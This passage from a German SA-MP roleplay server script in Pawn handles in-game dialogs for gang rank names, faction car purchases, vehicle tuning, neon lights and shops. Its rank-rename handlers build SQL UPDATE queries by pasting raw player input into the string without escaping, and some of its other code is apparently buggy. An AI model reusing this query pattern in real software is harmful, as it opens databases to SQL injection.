 	if(dialogid == DIALOG_RANG8) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname8 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
		//	mysql_function_query(mysqlcon,query,false,"","");
			mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang8],256,"%s",inputtext);
		}
 	}
 	if(dialogid == DIALOG_RANG9) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname9 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
		//	mysql_function_query(mysqlcon,query,false,"","");
			mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang9],256,"%s",inputtext);
		}
 	}
 	if(dialogid == DIALOG_RANG10) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname10 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
			//mysql_function_query(mysqlcon,query,false,"","");
			mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang10],256,"%s",inputtext);
		}
 	}
 	if(dialogid == DIALOG_RANG11) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname11 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
		//	mysql_function_query(mysqlcon,query,false,"","");
		    mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang11],256,"%s",inputtext);
		}
 	}
 	if(dialogid == DIALOG_RANG12) {
	    if(response && strlen(inputtext) > 0)
	    {
			SCM(playerid,COLOR_GRAD1,"* Du hast den Rangnamen erfolgreich geändert!");
			new query[256];
			format(query, sizeof(query), "UPDATE gangrangs SET rangname12 = '%s' WHERE fID=%i",inputtext,PlayerInfo[playerid][sMember]);
			//mysql_function_query(mysqlcon,query,false,"","");
			mysql_pquery(mysqlcon,query,"");

			new tmp=PlayerInfo[playerid][sMember];
			format(Rangname[tmp][Rang12],256,"%s",inputtext);
		}
 	}

    if(dialogid == DIALOG_FRAKCAR)
   	{
   	    new string[128];
   	    if(response == 1)
		   {
   	        switch(listitem)
			   {
   	            case 0:
				{ // Stretch
   	                SetPVarInt(playerid,"CarID",482); SetPVarInt(playerid,"CarPreis",300000);
				}
				case 1:
				{ // Infernus
   	                SetPVarInt(playerid,"CarID",521); SetPVarInt(playerid,"CarPreis",10000);
				}
				case 2:
				{ // Bus
   	                SetPVarInt(playerid,"CarID",560); SetPVarInt(playerid,"CarPreis",500000);
				}
				case 3:
				{ // Burrito
   	                SetPVarInt(playerid,"CarID",463); SetPVarInt(playerid,"CarPreis",90000);
				}
				case 4:
				{ // FCR-900
   	                SetPVarInt(playerid,"CarID",487); SetPVarInt(playerid,"CarPreis",120000);
				}
				case 5:
				{ // Merit
   	                SetPVarInt(playerid,"CarID",461); SetPVarInt(playerid,"CarPreis",70000);
				}
				case 6:
				{ // Sultan
   	                SetPVarInt(playerid,"CarID",468); SetPVarInt(playerid,"CarPreis",350000);
				}
				case 7:
				{ // Huntley
   	                SetPVarInt(playerid,"CarID",581); SetPVarInt(playerid,"CarPreis",130000);
				}
			}
			new fc;while(fc<MAX_FACTION_CARS)
			{
	   			if(FraktionsKasse[PlayerInfo[playerid][sMember]-1] >= GetPVarInt(playerid,"CarPreis"))
				{
					if(FactionCars[fc][fVehid] <= 400 || FactionCars[fc][fVehid] >= 611)
					{
				        FactionCars[fc][fVehid] = GetPVarInt(playerid,"CarID");
						FactionCars[fc][fPos][0] = 1023.1495;
				        FactionCars[fc][fPos][1] = -1091.6942;
				        FactionCars[fc][fPos][2] = 23.8349;
			         	FactionCars[fc][fPos][3] = 266.9258;
			         	FactionCars[fc][fTuning][16] = 100;
			            new Color[2];
			            GetDefaultCarColorOfFaction(GetPlayerLeader(playerid),Color[0],Color[1]);
						FactionCars[fc][fCol][0] = Color[0];
						FactionCars[fc][fCol][1] = Color[1];
						FactionCars[fc][fFaction] = PlayerInfo[playerid][sMember];
						FactionCars[fc][fCarid] = CreateVehicle(FactionCars[fc][fVehid],FactionCars[fc][fPos][0],FactionCars[fc][fPos][1],FactionCars[fc][fPos][2],FactionCars[fc][fPos][3],FactionCars[fc][fCol][0],FactionCars[fc][fCol][1],-1, 0);
						FraktionsKasse[PlayerInfo[playerid][sMember]-1] = FraktionsKasse[PlayerInfo[playerid][sMember]-1]-GetPVarInt(playerid,"CarPreis");
						format(string,128,"Dieses Fahrzeug hat %i$ gekostet. Das Geld hierfür wird aus der Fraktionskasse entnommen.",GetPVarInt(playerid,"CarPreis"));
						SCM(playerid,-1,string);
						SCM(playerid,COLOR_LIGHTBLUE,"Du hast das Auto erfolgreich für deine Fraktion gekauft!");
						SCM(playerid,COLOR_LIGHTBLUE,"Vergiss aber nicht es später mit /parken umzuparken!");
						PutPlayerInVehicle(playerid,FactionCars[fc][fCarid],0);
						Gas[FactionCars[fc][fCarid]]=80;
						return true;
					}
				}
				else
				{
					format(string,128,"Deine Fraktion hat nicht genug Geld (%i$) um diese Fahrzeug zu kaufen. (Kosten: %i$)",FraktionsKasse[PlayerInfo[playerid][sMember]-1],GetPVarInt(playerid,"CarPreis"));
					SCM(playerid,COLOR_GRAD2,string);
					return 1;
				}fc++;
			}
		}
		if(!response)
		{
			return SCM(playerid,COLOR_GRAD2,"Du hast den Vorgang abgebrochen.");
	 	}
		return 1;
   	}
	if(dialogid == 4575)
	{
        new vehicle = GetPlayerVehicleID(playerid);
        new carowner = GetDtCarOwner(vehicle);
	    new slot = GetDtCarOwnerSlot(carowner,vehicle);
		if(response)
		switch(listitem)
		{
			case 0:
			{
	            if(!IsADtCar(vehicle))
	            {
			        for(new fc;fc<sizeof(FactionCars);fc++)// Fraktionsfahrzeug
					{
				        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
						{
				            if(vehicle == FactionCars[fc][fCarid])
							{
								FactionCars[fc][fTuning][1] = 1010;
							}
						}
					}
		      	    AddVehicleComponent(vehicle, 1010); // Nitro
	                return 1;
	            }
		        PlayerCar[carowner][slot][CarNitro] = 1010;
		        AddVehicleComponent(vehicle, 1010); // Nitro
	    	}
			case 1:
			{
	            if(!IsADtCar(vehicle))
	            {
			        for(new fc;fc<sizeof(FactionCars);fc++)// Fraktionsfahrzeug
					{
				        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
						{
				            if(vehicle == FactionCars[fc][fCarid])
							{
								FactionCars[fc][fTuning][6] = 1074;
							}
						}
					}
				    AddVehicleComponent(vehicle, 1074); // Wheel Mega
	                return 1;
	            }
			    PlayerCar[carowner][slot][CarWheel] = 1074;
			    AddVehicleComponent(vehicle, 1074); // Wheel Mega
 		    }
			case 2:
			{
  				  if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 483)
  				  {
						PlayerCar[carowner][slot][CarPJ] = 0;
						ChangeVehiclePaintjob(GetPlayerVehicleID(playerid), 0);
				  }
 		    }
			case 3:
			{

						PlayerCar[carowner][slot][LPG] = 1;


 		    }


			case 4:
			{

			    PlayerCar[carowner][slot][CarHyd] = 1087;
			    AddVehicleComponent(vehicle, 1087); // Wheel Mega


 		    }
			case 5:
			{

			    	PlayerCar[carowner][slot][CarTurbo] = 1;


 		    }
        }
    }
	if(dialogid == DIALOG_NEON)
	{
		if(response)
		switch(listitem)
		{
			case 0://NEONBLAU 1000000
			{
	   			    new vehicleid;
	 			    vehicleid = GetPlayerVehicleID(playerid);
					if(IsAPlane(vehicleid)|| IsABoat(vehicleid) ||IsABike(vehicleid) ||IsARoller(vehicleid))
			        {
					SCM(playerid,COLOR_GRAD2,"An diesem Fahrzeug kannst du kein Neon instalieren.");
				    return 1;
					}
//		         	FraktionsKasse[6] += 1000000;
//	     		    GivePlayerMoneySave(playerid, -1000000);

					new vid = GetPlayerVehicleID(playerid);
					new carowner = GetDtCarOwner(vid);
	        	    new slot = GetDtCarOwnerSlot(carowner,vid);

					if(PlayerCar[carowner][slot][Neon] >= 1)
					{
           			DestroyObject(Neonrohr[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId]][Neon]);
          			DestroyObject(Neonrohr[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId]][Neon1]);
					}
					new Float:x,Float:y,Float:z;
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon] = CreateObject(18648,x,y,z,0,0,0,283);
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1] = CreateObject(18648,x,y,z,0,0,0,283);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon], PlayerCar[carowner][slot][CarId], 0.8,0,-0.70,0,0,0);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1],PlayerCar[carowner][slot][CarId], -0.8,0,-0.70,0,0,0);
					SCM(playerid,COLOR_LIGHTBLUE,"* Du hast dir eine Blaue Neon-Röhre unter dein Fahrzeug gebaut.");
					PlayerCar[carowner][slot][Neon]=1;
					new stringfz22[128];
		            format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
					dini_Remove(stringfz22);

			}
			case 1://NEONROT
			{
	   			    new vehicleid;
	 			    vehicleid = GetPlayerVehicleID(playerid);
					if(IsAPlane(vehicleid)|| IsABoat(vehicleid) ||IsABike(vehicleid) ||IsARoller(vehicleid))
			        {
					SCM(playerid,COLOR_GRAD2,"An diesem Fahrzeug kannst du kein Neon instalieren.");
				    return 1;
					}
					new vid = GetPlayerVehicleID(playerid);
					new carowner = GetDtCarOwner(vid);
	        	    new slot = GetDtCarOwnerSlot(carowner,vid);
//		         	FraktionsKasse[6] += 1000000;
//	     		    GivePlayerMoneySave(playerid, -1000000);
					if(PlayerCar[carowner][slot][Neon] >= 1)
					{
           			DestroyObject(Neonrohr[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId]][Neon]);
          			DestroyObject(Neonrohr[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId]][Neon1]);
					}
					new Float:x,Float:y,Float:z;
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon] = CreateObject(18647,x,y,z,0,0,0,283);
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1] = CreateObject(18647,x,y,z,0,0,0,283);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon], PlayerCar[carowner][slot][CarId], 0.8,0,-0.70,0,0,0);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1],PlayerCar[carowner][slot][CarId], -0.8,0,-0.70,0,0,0);
					SCM(playerid,COLOR_LIGHTBLUE,"* Du hast dir eine Rote Neon-Röhre unter dein Fahrzeug gebaut.");
					PlayerCar[carowner][slot][Neon]=2;
					new stringfz22[128];
		            format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
					dini_Remove(stringfz22);

			}
			case 2://NEONGRÜN
			{
	   			    new vehicleid;
	 			    vehicleid = GetPlayerVehicleID(playerid);
					if(IsAPlane(vehicleid)|| IsABoat(vehicleid) ||IsABike(vehicleid) ||IsARoller(vehicleid))
			        {
					SCM(playerid,COLOR_GRAD2,"An diesem Fahrzeug kannst du kein Neon instalieren.");
				    return 1;
					}
					new vid = GetPlayerVehicleID(playerid);
					new carowner = GetDtCarOwner(vid);
	        	    new slot = GetDtCarOwnerSlot(carowner,vid);
//		         	FraktionsKasse[6] += 1000000;
//	     		    GivePlayerMoneySave(playerid, -1000000);
					if(PlayerCar[carowner][slot][Neon] >= 1)
					{
           			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon]);
          			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1]);
					}
					new Float:x,Float:y,Float:z;
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon] = CreateObject(18649,x,y,z,0,0,0,283);
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1] = CreateObject(18649,x,y,z,0,0,0,283);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon], PlayerCar[carowner][slot][CarId], 0.8,0,-0.70,0,0,0);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1],PlayerCar[carowner][slot][CarId], -0.8,0,-0.70,0,0,0);
					SCM(playerid,COLOR_LIGHTBLUE,"* Du hast dir eine Grüne Neon-Röhre unter dein Fahrzeug gebaut.");
					PlayerCar[carowner][slot][Neon]=3;
					new stringfz22[128];
		            format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
					dini_Remove(stringfz22);
			}
			case 3://NEONWEIß
			{
	   			    new vehicleid;
	 			    vehicleid = GetPlayerVehicleID(playerid);
					if(IsAPlane(vehicleid)|| IsABoat(vehicleid) ||IsABike(vehicleid) ||IsARoller(vehicleid))
			        {
					SCM(playerid,COLOR_GRAD2,"An diesem Fahrzeug kannst du kein Neon instalieren.");
				    return 1;
					}
//		         	FraktionsKasse[6] += 1000000;
					new vid = GetPlayerVehicleID(playerid);
					new carowner = GetDtCarOwner(vid);
	        	    new slot = GetDtCarOwnerSlot(carowner,vid);

//	     		    GivePlayerMoneySave(playerid, -1000000);
					if(PlayerCar[carowner][slot][Neon] >= 1)
					{
           			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon]);
          			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1]);
					}
					new Float:x,Float:y,Float:z;
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon] = CreateObject(18652,x,y,z,0,0,0,283);
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1] = CreateObject(18652,x,y,z,0,0,0,283);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon], PlayerCar[carowner][slot][CarId], 0.8,0,-0.70,0,0,0);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1],PlayerCar[carowner][slot][CarId], -0.8,0,-0.70,0,0,0);
					SCM(playerid,COLOR_LIGHTBLUE,"* Du hast dir eine Weiße Neon-Röhre unter dein Fahrzeug gebaut.");
					PlayerCar[carowner][slot][Neon]=4;
					new stringfz22[128];
		            format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
					dini_Remove(stringfz22);
			}
			case 4://NEONPINK
			{

	   			    new vehicleid;
	 			    vehicleid = GetPlayerVehicleID(playerid);
					if(IsAPlane(vehicleid)|| IsABoat(vehicleid) ||IsABike(vehicleid) ||IsARoller(vehicleid))
			        {
					SCM(playerid,COLOR_GRAD2,"An diesem Fahrzeug kannst du kein Neon instalieren.");
				    return 1;
					}

					new vid = GetPlayerVehicleID(playerid);
					new carowner = GetDtCarOwner(vid);
	        	    new slot = GetDtCarOwnerSlot(carowner,vid);
//		         	FraktionsKasse[6] += 1000000;
//	     		    GivePlayerMoneySave(playerid, -1000000);
					if(PlayerCar[carowner][slot][Neon] >= 1)
					{
           			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon]);
          			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1]);
					}
					new Float:x,Float:y,Float:z;
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon] = CreateObject(18651,x,y,z,0,0,0,283);
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1] = CreateObject(18651,x,y,z,0,0,0,283);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon], PlayerCar[carowner][slot][CarId], 0.8,0,-0.70,0,0,0);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1],PlayerCar[carowner][slot][CarId], -0.8,0,-0.70,0,0,0);
					SCM(playerid,COLOR_LIGHTBLUE,"* Du hast dir eine Pinke Neon-Röhre unter dein Fahrzeug gebaut.");
					PlayerCar[carowner][slot][Neon]=5;
					new stringfz22[128];
		            format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
					dini_Remove(stringfz22);
			}
			case 5://NEONGELB
			{
	   			    new vehicleid;
	 			    vehicleid = GetPlayerVehicleID(playerid);
					if(IsAPlane(vehicleid)|| IsABoat(vehicleid) ||IsABike(vehicleid) ||IsARoller(vehicleid))
			        {
					SCM(playerid,COLOR_GRAD2,"An diesem Fahrzeug kannst du kein Neon instalieren.");
				    return 1;
					}
					new vid = GetPlayerVehicleID(playerid);
					new carowner = GetDtCarOwner(vid);
	        	    new slot = GetDtCarOwnerSlot(carowner,vid);
//		         	FraktionsKasse[6] += 1000000;
//	     		    GivePlayerMoneySave(playerid, -1000000);
					if(PlayerCar[carowner][slot][Neon] >= 1)
					{
           			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon]);
          			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1]);
					}
					new Float:x,Float:y,Float:z;
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon] = CreateObject(18650,x,y,z,0,0,0,283);
					Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1] = CreateObject(18650,x,y,z,0,0,0,283);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon], PlayerCar[carowner][slot][CarId], 0.8,0,-0.70,0,0,0);
					AttachObjectToVehicle(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1],PlayerCar[carowner][slot][CarId], -0.8,0,-0.70,0,0,0);
					SCM(playerid,COLOR_LIGHTBLUE,"* Du hast dir eine Gelbe Neon-Röhre unter dein Fahrzeug gebaut.");
					PlayerCar[carowner][slot][Neon]=6;
					new stringfz22[128];
		            format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
					dini_Remove(stringfz22);
			}
			case 6://Abbauen
			{
	   			    new vehicleid;
	 			    vehicleid = GetPlayerVehicleID(playerid);
					if(IsAPlane(vehicleid)|| IsABoat(vehicleid) ||IsABike(vehicleid) ||IsARoller(vehicleid))
			        {
					SCM(playerid,COLOR_GRAD2,"An diesem Fahrzeug kannst du kein Neon instalieren.");
				    return 1;
					}
					new vid = GetPlayerVehicleID(playerid);
					new carowner = GetDtCarOwner(vid);
	        	    new slot = GetDtCarOwnerSlot(carowner,vid);
//		         	FraktionsKasse[6] += 1000000;
//	     		    GivePlayerMoneySave(playerid, -1000000);
					if(PlayerCar[carowner][slot][Neon] >= 1)
					{
           			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon]);
          			DestroyObject(Neonrohr[PlayerCar[carowner][slot][CarId]][Neon1]);
					}
					SCM(playerid,COLOR_LIGHTBLUE,"* Du hast dein Neon unter deinem Fahrzeug abgebaut.");
					PlayerCar[carowner][slot][Neon]=0;
					new stringfz22[128];
		            format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
					dini_Remove(stringfz22);
			}
		}
	}
    if(dialogid == 1338)
    {
        if(response)
        {
           if(IsPlayerInAnyVehicle(playerid))
      	   {
		    new vid = GetPlayerVehicleID(playerid);
//		    new car = GetVehicleModel(GetPlayerVehicleID(playerid));  // KB OB DAS GEHT HAHAHAHAHAHAAH MIT DIALOG  !
	        if(!IsAHandelCar(vid) && !IsAShowCarEdel(vid))
			{
			SendClientMessage(playerid, COLOR_GRAD2, "Du kannst dieses Fahrzeug nicht kaufen.");
			return 1;
			}
  		    new Model,Preis;
  		    if(Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])  // gilt auch für Fcar verhindertg
			{
			  SendClientMessage(playerid, COLOR_GREY, "Du besitzt schon ein Fahrzeug auf dem ausgewählten Schlüssel!");
			  RemovePlayerFromVehicle(playerid);
			  return 1;
			}
  		    for(new ah = 0; ah < sizeof(dtcKaufliste);ah++)
	     	{
	    		if(dtcKaufliste[ah][dtc_Autohaus] == dtc_AutohausCat[playerid] && dtcKaufliste[ah][dtc_CarModel] == GetVehicleModel(vid))
	    		{
	    		    Model = GetVehicleModel(vid);
	    			Preis = dtcKaufliste[ah][dtc_CarPreis];
	    		}
	    	}
	        if(GetPlayerMoneySave(playerid) >= Preis)
			{
			    /*
			    if(PlayerInfo[playerid][pLeader]>0)
			    {
			        SetPVarInt(playerid,"FModelID",Model);
			        SetPVarInt(playerid,"FPreis",Preis);
	    	 		ShowPlayerDialog(playerid, DIALOG_FAUTOKAUF, DIALOG_STYLE_MSGBOX, CarName[car-400], "Möchtest du dieses Fahrzeug für dich oder deine Fraktion kaufen?", "Kaufen", "Verlassen");
				}*/
			    OnPlayerBuyCar(playerid, Model, Preis);
				dtc_AutohausCar[playerid] = 0;
				dtc_AutohausCat[playerid] = 2000;
				RemovePlayerFromVehicle(playerid);
				SetTimerEx("ShowPlayerCar",3000,0,"i",playerid);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "Herzlichen Glückwunsch");
         		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Sie haben sich für ein sehr schönes Fahrzeug entschieden,");
         		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Viel Spaß damit.");
         		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Dein Admin-Team.");
                PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
 			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"Du hast nicht genug Geld um dieses Fahrzeug zu kaufen!");
				RemovePlayerFromVehicle(playerid);
				return 1;
			}
	      }
        }
        else
        {
			RemovePlayerFromVehicle(playerid);
        }
        return 1;
    }
    /*    // Nevermind gibts ja schon xD

    if(dialogid == DIALOG_FAUTOKAUF)
	{
	    new Model = GetPVarInt(playerid,"FModelID");
	    new Preis = GetPVarInt(playerid,"FPreis");
	    if(GetPlayerMoneySave(playerid) >= Preis)
	    {
	        new faction[5];
            	for(new fc;fc<sizeof(FactionCars);fc++){
				        FactionCars[fc][fVehid] = Model;
	        new Float:fX,Float:fY,Float:fZ,Float:fA;
	        GetPlayerPos(playerid,fX,fY,fZ),GetPlayerFacingAngle(playerid,fA);
	        FactionCars[fc][fPos][0] = fX;
	        FactionCars[fc][fPos][1] = fY;
	        FactionCars[fc][fPos][2] = fZ;
	        FactionCars[fc][fPos][3] = fA;
	        FactionCars[fc][fCol][0] = 1;
	        FactionCars[fc][fCol][1] = 1;
	        dtc_AutohausCar[playerid] = 0;
			dtc_AutohausCat[playerid] = 2000;

			FactionCars[fc][fCarid] = CreateVehicle(FactionCars[fc][fVehid],FactionCars[fc][fPos][0],FactionCars[fc][fPos][1],FactionCars[fc][fPos]);


	        FactionCars[fc][fTuning][16] = 100;
	        FactionCars[fc][fPrice] = 0;
		    for(new mood;mood<16;mood++)
		    FactionCars[fc][fTuning][mood] = 0;



	        for(new f;f<5;f++){
	        FactionCars[fc][fFaction][f] = faction[f];
	        }
	        }
	    }

     	SendClientMessage(playerid, COLOR_LIGHTBLUE, "Herzlichen Glückwunsch");
   		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Sie haben sich für ein sehr schönes Fahrzeug entschieden,");
   		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Viel Spaß damit.");
   		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Dein Admin-Team.");
	}*/
	if(dialogid ==DIALOG_AUSRUESTEN)
	{
	    if(response)
	    {
            if(listitem==0)
            {
            ServerWeapon(playerid, 24, 50);
            }
            if(listitem==1)
            {
            ServerWeapon(playerid, 25, 50);
            }
            if(listitem==2)
            {
            ServerWeapon(playerid, 29, 50);
            }
            if(listitem==3)
            {
            ServerWeapon(playerid, 31, 50);
            }
            if(listitem==4)
            {
            ServerWeapon(playerid, 34, 50);
            }
            if(listitem==5)
            {
            ServerWeapon(playerid, 4, 50);
            }
        }
    }
    new Float:bsnhealth;
   	GetPlayerHealth(playerid, bsnhealth);
 	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	new giveplayer[MAX_PLAYER_NAME];

	if(dialogid == DIALOG_FlugSF)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
			SFLSCheckpoint[playerid]=1;
			SetPlayerCheckpoint(playerid,-1178.5709,-302.8671,15.4808,8.0);
			SendClientMessage(playerid,COLOR_GREEN,"Sie haben ihre Flugroute gestartet.");
	        }
	        if(listitem == 1)
	        {
	        SFLVCheckpoint[playerid]=1;
	        SetPlayerCheckpoint(playerid,-1178.5709,-302.8671,15.4808,8.0);
	        SendClientMessage(playerid,COLOR_GREEN,"Sie haben ihre Flugroute gestartet.");
	        }
		}
	}
	if(dialogid == DIALOG_FlugLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
			LVSFCheckpoint[playerid]=1;
			SetPlayerCheckpoint(playerid,1360.9410,1343.5552,12.1475,8.0);
			SendClientMessage(playerid,COLOR_GREEN,"Sie haben ihre Flugroute gestartet.");
	        }
	        if(listitem == 1)
	        {
	        LVLSCheckpoint[playerid]=1;
	        SetPlayerCheckpoint(playerid,1360.9410,1343.5552,12.1475,8.0);
	        SendClientMessage(playerid,COLOR_GREEN,"Sie haben ihre Flugroute gestartet.");
	        }
		}
	}

	if(dialogid == DIALOG_Buslinien)
	{
	    if(response)
	    {
	        if(listitem == 0)// Linie 1
	        {
			Navi[playerid] = 0;
	        ProxDetector(5.0, playerid, "Nächster Halt: Busbahnhof Nord", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
            PlayerInfo[playerid][Haltestelle]=0;
			SetPlayerCheckpoint(playerid,1173.1632,-1825.9095,13.1255,6.0);
			L1Checkpoint[playerid]=1;
	        }
	        if(listitem == 1)// Linie 2
	        {
			Navi[playerid] = 0;
	        ProxDetector(5.0, playerid, "Nächster Halt: Burger Shot Nord", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
            PlayerInfo[playerid][Haltestelle2]=1;
			L2Checkpoint[playerid]=1;
			SetPlayerCheckpoint(playerid,1181.5731,-936.9670,42.8555,6.0);
	        }
		}
	}
    if(dialogid ==DIALOG_BUY)
    {
    if(response)
    {
            if(listitem==0)
            {
			    if(PlayerInfo[playerid][pZollPass] == 1)
			    {
			        SendClientMessage(playerid, COLOR_GRAD2, "* Du hast bereits einen Zollpass! Er läuft nach 25 PayDays ab.");
			        return 1;
			    }

					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 7500;

			    GivePlayerMoneySave(playerid, -7500);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast dir einen Zollpass gekauft. Dieser läuft nach 25 PayDays ab.");
                GameTextForPlayer(playerid, "~r~-$7500", 5000, 1);
				PlayerInfo[playerid][pZollPass] = 1;
				PlayerInfo[playerid][pZollPassTime] += 1;

		    }
		    if(listitem==1)
            {
	            new randphone = 10000 + random(89999);
		        PlayerInfo[playerid][pPnumber] = randphone;
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast dir eine neue Handynummer gekauft.");
	            GameTextForPlayer(playerid, "~r~-$2500", 5000, 1);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 2500;
				GivePlayerMoneySave(playerid, -2500);
            }
		    if(listitem==2)
            {
		        PlayerInfo[playerid][pHelm] = 1;
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast dir einen Motoradhelm gekauft.");
	            GameTextForPlayer(playerid, "~r~-$2500", 5000, 1);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 2500;
				GivePlayerMoneySave(playerid, -2500);
            }
		    if(listitem==3)
            {
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast dir einen Feuerlöscher gekauft.");
	            GameTextForPlayer(playerid, "~r~-$2500", 5000, 1);
				BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
				BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 2500;
				ServerWeapon(playerid, 42,999);
				GivePlayerMoneySave(playerid, -2500);
            }
        }
    }
	if(dialogid==DIALOG_ZOLLCONTROL)
	{
	    switch(listitem)
	    {
	        case 0: // ID
	        {
	            ShowPlayerDialog(playerid, DIALOG_ZOLLCONTROL2, DIALOG_STYLE_INPUT, "Zollkontrolle", "Zoll-ID eingeben:", "Absenden", "Abbrechen");
	        }
	        case 1: // LS-SF
	        {
				if(zollvar[0] == 0) {
				    zollvar[0] = 1;
				    zollvar[1] = 1;
				    zollvar[2] = 1;
				    zollvar[3] = 1;
				    zollvar[12] = 1;
				    zollvar[13] = 1;
				    zollvar[14] = 1;
				    zollvar[15] = 1;
